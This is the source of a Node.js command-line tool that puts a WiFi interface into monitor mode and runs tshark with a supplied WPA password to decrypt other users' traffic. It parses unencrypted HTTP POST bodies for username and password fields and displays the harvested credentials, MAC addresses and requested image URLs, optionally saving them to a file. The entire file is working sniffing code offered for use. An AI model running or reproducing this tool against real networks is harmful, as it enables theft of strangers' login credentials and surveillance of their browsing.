const fs = require('fs')
const qs = require('qs')
const path = require('path');
const JSONStream = require('JSONStream')
const {exec}= require('shelljs')
const meow = require('meow')

const formatPacket = require(`./src/formatPacket`)
const Gui = require(`./src/Gui`)
const {userFields, passFields} = require(`./src/fields`)

const cli = meow(`
    Usage
      $ wos <options>

    Important
      Use single quotes in order to escape special characters.

    Options
      -i, --interface Capture interface
      -s, --ssid Wifi SSID
      -p, --pass Wifi password
      -n, --no-monitor Disable monitor mode
      -f, --format Format: dash (default), text
      -o, --outfile Output file

    Examples
      $ wos -i en0 --ssid='HomeWifi' --pass='d4Pazsw0rD' -o sheep.txt
`)

const {flags} = cli

const ssid = process.env.WOS_SSID || flags.ssid || flags.s
const pass = process.env.WOS_PASS || flags.pass || flags.p
const interface = process.env.WOS_INTERFACE || flags.interface || flags.i
const disableMonitor = process.env.WOS_NO_MONITOR || flags.n || flags.noMonitor || (flags.monitor != null ? true : false)
const outfile = process.env.WOS_OUTPUT || flags.o || flags.outfile
let format = process.env.WOS_FORMAT || flags.f || flags.format

if (!(format === 'dash' || format === 'text')) {
  format = 'dash'
}

if (!interface) {
  cli.showHelp()
  return false
}

const monitor = disableMonitor ? '' : '-I'
let decKeys = ''

if (pass) {
  decKeys = `-o \"uat:80211_keys:\\\"wpa-pwd\\\",\\\"${pass}:${ssid}\\\"\"`
}

const cmd = `tshark ${monitor} -i ${interface} -o wlan.enable_decryption:TRUE ${decKeys} -T json -V -Y \"tcp.port==80 or udp.port==80 or eapol\" 2> /dev/null`

const gui = new Gui(format)

// start capture
const child = exec(cmd, {async: true, silent: true})

child.stdout.pipe(JSONStream.parse('*._source.layers'))
.on('data', processLine)

if (process.platform === 'darwin') {
  const airportBin = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';

  const infoChild = exec(`${airportBin} -I`, {async: true, silent: true})
  infoChild.stdout.on('data', line => {
    if (line) {
      line.split('\n').forEach(x => {
        gui.infoLogAddRow(x)
      })
    }
  })

} else {
  gui.infoLogAddRow('Could not show wifi info')
}

function processLine (layers) {
  const {
    port,
    method,
    host,
    dstip,
    srcip,
    srcmac,
    httpData,
    eapolDataLen,
    wlanMac,
    wlanMacResolved,
    fullRequestUri
  } = formatPacket(layers)

  /*
   * the fourth and final eapol packet finalizes the handshake
   * between client and router so there is no data.
   * EAPOL packets exchange PMK keys.
   */

  if (eapolDataLen === '0') {
    gui.connectionsLogAddRow(`${wlanMacResolved} ${wlanMac}`)
  }

  let account = ''
  let password = ''

  if (method === 'POST') {
    let obj = null

    try {
      obj = JSON.parse(httpData)
    } catch(error) {
      obj = qs.parse(httpData)
    }

    var keys = Object.keys(obj)
    keys.forEach(key => {
      if (userFields.indexOf(key) > -1) {
        account = obj[key]
      } else if (passFields.indexOf(key) > -1) {
        password = obj[key]
      }
    })

    if (account || password || httpData) {
      const row = [account||'', password||'', port||'', host||'', dstip||'', srcip||'', srcmac||'', httpData||'']

      gui.addRow(row)

      if (outfile) {
        fs.appendFile(outfile, row.join('\t'), () => {})
      }
    }
  }

  if (isImage(fullRequestUri)) {
    gui.imageLogAddRow(fullRequestUri)
  }
}

function isImage (uri) {
  if (!uri) return false

  const pattern = /\.(png|gif|jpe?g|bmp)$/i

  return pattern.test(uri)
}

// quit with ctrl-c
process.stdin.setRawMode(true)
process.stdin.on('data', function(b) {
  if (b[0] === 3) {
    process.stdin.setRawMode(false)
    process.exit()
  }
})
